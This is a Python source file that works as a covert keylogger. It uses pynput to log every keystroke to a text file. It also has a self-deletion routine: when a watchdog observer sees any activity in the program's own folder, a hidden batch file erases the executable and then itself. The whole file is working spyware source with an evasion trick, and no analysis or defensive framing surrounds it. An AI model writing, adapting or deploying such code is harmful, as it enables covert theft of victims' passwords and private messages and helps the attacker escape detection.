from pynput import keyboard
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
import os, sys, time, subprocess

def delete_self():
    path_exe = os.path.realpath(sys.argv[0])  # get absolute path to exe file
    bat = path_exe + ".bat"                   # make a bat file next to exe file

    bat_contents = f"""
        @echo off
        :loop
        del "{path_exe}" >nul 2>&1
        if exist "{path_exe}" goto loop
        del "{bat}" >nul 2>&1
    """

    with open(bat, "w") as f:
        f.write(bat_contents)

    subprocess.Popen([bat], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)

class DirectoryOpened(FileSystemEventHandler):
    def on_any_event(self, event):
        print("deleting self")
        delete_self()
        observer.stop()
    def on_created(self, event):
        print("created class")

def on_press(key):
    if key == keyboard.Key.esc:
        return False
    
    current_path = os.path.dirname(sys.executable)
    path = os.path.dirname(current_path) + "/log.txt"

    with open(path, "a") as file:
        try:
            file.write(f"{key.char}")
        except AttributeError:
            if key.name == "enter":
                file.write("\n")
            elif key.name == "space":
                file.write(" ")
            else:
                file.write(f"[{key.name}]")
    
listener = keyboard.Listener(on_press=on_press)
listener.start()
# listener.join()     # waits for listener to stop listening
        
directory_path = os.path.dirname(sys.executable)
print(directory_path)
observer = Observer()
observer.schedule(DirectoryOpened(), path=directory_path, recursive=False)
observer.start()
print("observer started")

while observer.is_alive():
    time.sleep(1)
listener.stop()

# delete_self()

print("program over")

